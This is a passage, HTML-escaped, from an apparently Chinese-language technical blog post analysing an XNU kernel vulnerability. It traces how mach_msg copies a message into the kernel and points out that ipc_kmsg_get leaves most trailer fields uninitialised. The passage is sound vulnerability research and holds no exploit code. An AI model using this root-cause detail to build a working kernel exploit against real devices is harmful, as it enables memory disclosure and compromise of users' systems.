    &lt;span class=&quot;n&quot;&gt;MACH_RCV_TIMEOUT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; 
	&lt;span class=&quot;n&quot;&gt;MACH_RCV_LARGE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; 
	&lt;span class=&quot;n&quot;&gt;MACH_RCV_LARGE_IDENTITY&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; 
	&lt;span class=&quot;n&quot;&gt;MACH_RCV_VOUCHER&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; 
	&lt;span class=&quot;n&quot;&gt;MACH_RCV_TRAILER_MASK&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; 
	&lt;span class=&quot;n&quot;&gt;MACH_RCV_SYNC_WAIT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;MACH_RCV_SYNC_PEEK&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; 
	&lt;span class=&quot;n&quot;&gt;MACH_RCV_GUARDED_DESC&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; 
	&lt;span class=&quot;n&quot;&gt;MACH_MSG_STRICT_REPLY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;如果对于Mach Message发送与接收基本流程不理解的同学一定多看看上面这几段代码&lt;/p&gt;

&lt;p&gt;以下假设大家对于Mach Message都有了一定的基本理解，并且删除了部分调试与失败返回处理代码&lt;/p&gt;

&lt;p&gt;我们跟入函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_msg()&lt;/code&gt;，函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_msg()&lt;/code&gt;会调用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_msg_trap()&lt;/code&gt;，函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_msg_trap()&lt;/code&gt;会调用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_msg_overwrite_trap()&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_return_t&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;mach_msg_trap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg_overwrite_trap_args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;kern_return_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rcv_msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_vm_address_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg_overwrite_trap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这里有两种我们需要分析的场景：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MACH_RCV_MSG&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MACH_SEND_MSG&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;当函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_msg()&lt;/code&gt;第二个参数是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MACH_SEND_MSG&lt;/code&gt;的时候，函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_kmsg_get()&lt;/code&gt;用于分配缓冲区并从用户态拷贝数据到内核态&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_return_t&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;mach_msg_overwrite_trap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg_overwrite_trap_args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_vm_address_t&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;msg_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_option_t&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;option&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// mach_msg()第二个参数&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;mach_msg_return_t&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;mr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 大吉大利&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;vm_map_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;map&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

	&lt;span class=&quot;cm&quot;&gt;/* Only accept options allowed by the user */&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;option&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_OPTION_USER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;option&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_SEND_MSG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;ipc_space_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;space&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_space&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;ipc_kmsg_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// 创建kmsg变量&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// 分配缓冲区并从用户态拷贝数据到内核态&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;mr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_kmsg_get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;send_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	    &lt;span class=&quot;c1&quot;&gt;// 转换端口，从用户态转换为内核态地址&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;mr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_kmsg_copyin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;space&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;override&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;c1&quot;&gt;// 发送消息&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;mr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_kmsg_send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg_timeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;option&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_RCV_MSG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_kmsg_get()&lt;/code&gt;属于漏洞函数，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_kmsg_t&lt;/code&gt;就是内核态的消息存储结构体，拷贝过程看注释&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_return_t&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;ipc_kmsg_get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_vm_address_t&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;msg_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;ipc_kmsg_t&lt;/span&gt;              &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsgp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt;                 &lt;span class=&quot;n&quot;&gt;msg_and_trailer_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;ipc_kmsg_t&lt;/span&gt;                      &lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_max_trailer_t&lt;/span&gt;          &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_legacy_base_t&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;legacy_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;len_copied&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;legacy_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_descriptor_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;c1&quot;&gt;// 长度参数检查&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// mach_msg_legacy_base_t结构体长度等于mach_msg_base_t&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_legacy_header_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;len_copied&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_legacy_header_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;len_copied&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_legacy_base_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	
	&lt;span class=&quot;c1&quot;&gt;// 从用户态拷贝消息到内核态&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;copyinmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;legacy_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len_copied&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_SEND_INVALID_DATA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// 获取内核态消息变量起始地址&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;msg_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;legacy_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// 直接加上最长的trailer长度，不知道接收者会定义何种类型的trailer，此处是做备用操作&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// typedef mach_msg_mac_trailer_t mach_msg_max_trailer_t;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// #define MAX_TRAILER_SIZE ((mach_msg_size_t)sizeof(mach_msg_max_trailer_t))&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;msg_and_trailer_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAX_TRAILER_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	
	&lt;span class=&quot;c1&quot;&gt;// 分配内核空间&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_kmsg_alloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg_and_trailer_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// 初始化kmsg.ikm_header部分字段&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// 拷贝消息体，此处不包括trailer&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;copyinmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;ipc_kmsg_free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_SEND_INVALID_DATA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// 通过size找到kmsg尾部trailer的起始地址，进行初始化&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 注意它的msgh_trailer_size是最小的MACH_MSG_TRAILER_MINIMUM_SIZE&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_max_trailer_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vm_offset_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_sender&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sec_token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_audit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;audit_token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_trailer_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_TRAILER_FORMAT_0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_trailer_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_TRAILER_MINIMUM_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_labels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	
	&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsgp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_kmsg_get()&lt;/code&gt;结尾赋值trailer的时候，使用的是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_msg_max_trailer_t&lt;/code&gt;，给&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kmsg&lt;/code&gt;申请的长度也是按照&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_msg_max_trailer_t&lt;/code&gt;计算，但只初始化了三个字段，其它字段并未初始化，这是漏洞成因之一&lt;/p&gt;
